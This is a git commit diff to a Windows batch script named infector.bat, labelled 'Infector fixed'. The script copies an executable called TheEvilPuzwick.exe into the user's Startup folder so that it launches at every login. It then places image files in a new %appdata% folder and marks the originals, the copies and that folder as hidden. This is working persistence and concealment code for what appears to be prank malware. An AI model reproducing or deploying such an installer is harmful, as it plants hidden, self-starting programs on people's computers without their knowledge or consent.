d029e2de07d896d9d0f53db985a9b2b278d70c5a
RichardBoy05 <73103244+RichardBoy05@users.noreply.github.com>
2022-06-19 09:36:24 +0200

    Bug fixes
    Infector fixed

--- infector.bat
+++ infector.bat
@@ -6,12 +6,15 @@ attrib -h TheEvilPuzwick.exe
 attrib -h puzwick_ico.png
 attrib -h puzwick.png
 
-move TheEvilPuzwick.exe "%appdata%\Microsoft\Windows\Start Menu\Programs\Startup"
+copy TheEvilPuzwick.exe "%appdata%\Microsoft\Windows\Start Menu\Programs\Startup"
 
 mkdir "%appdata%\TheEvilPuzwick"
-move puzwick_ico.png "%appdata%\TheEvilPuzwick"
-move puzwick.png "%appdata%\TheEvilPuzwick"
+copy puzwick_ico.png "%appdata%\TheEvilPuzwick"
+copy puzwick.png "%appdata%\TheEvilPuzwick"
 
+attrib +h TheEvilPuzwick.exe
+attrib +h puzwick_ico.png
+attrib +h puzwick.png
 attrib +h "%appdata%\TheEvilPuzwick"
 attrib +h "%appdata%\TheEvilPuzwick\puzwick_ico.png"
 attrib +h "%appdata%\TheEvilPuzwick\puzwick.png"
